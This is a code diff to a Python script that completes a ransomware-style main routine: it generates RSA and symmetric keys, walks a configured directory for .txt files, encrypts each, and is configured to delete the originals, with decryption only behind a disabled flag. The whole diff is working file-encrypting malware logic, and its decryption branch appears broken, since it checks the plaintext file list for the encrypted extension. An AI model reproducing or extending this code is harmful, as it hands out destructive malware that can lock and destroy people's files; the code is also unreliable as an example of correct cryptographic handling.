@@ -15,6 +15,7 @@ CONFIG = {
     'target_directory': r'C:\Users\benji\Desktop\test',
     'delete_files_after_encryption': True,
     'perform_smem_decryption': False  # Set to True to enable decryption
+    #'perform_smem_decryption': True 
 }
 
 # Function to load or generate RSA key pair
@@ -120,4 +121,35 @@ def decrypt_file(smem, file_path):
     os.remove(file_path)
 
 # Main function to orchestrate the encryption and decryption process
-def main
+def main():
+    private_key, public_key = load_or_generate_rsa_keys()
+
+    # Check if smem-enc file exists, if not encrypt the symmetric key
+    if not os.path.exists('smem-enc'):
+        smem = os.urandom(32)
+        with open(CONFIG['smem_file'], 'wb') as f:
+            f.write(smem)
+        encrypt_symmetric_key(smem, public_key)
+
+    # Identify target files to encrypt
+    target_files = []
+    for root, dirs, files in os.walk(CONFIG['target_directory']):
+        for file in files:
+            if file.endswith('.txt'):
+                target_files.append(os.path.join(root, file))
+
+    # Encrypt target files
+    for file_path in target_files:
+        encrypted_file_path = file_path + CONFIG['encrypted_file_extension']
+        if not os.path.exists(encrypted_file_path):
+            encrypt_file(smem, file_path)
+
+    # Perform symmetric key decryption if configured
+    if CONFIG['perform_smem_decryption']:
+        decrypt_smem_enc(private_key)
+        for file_path in target_files:
+            if file_path.endswith(CONFIG['encrypted_file_extension']):
+                decrypt_file(smem, file_path)
+
+if __name__ == '__main__':
+    main()
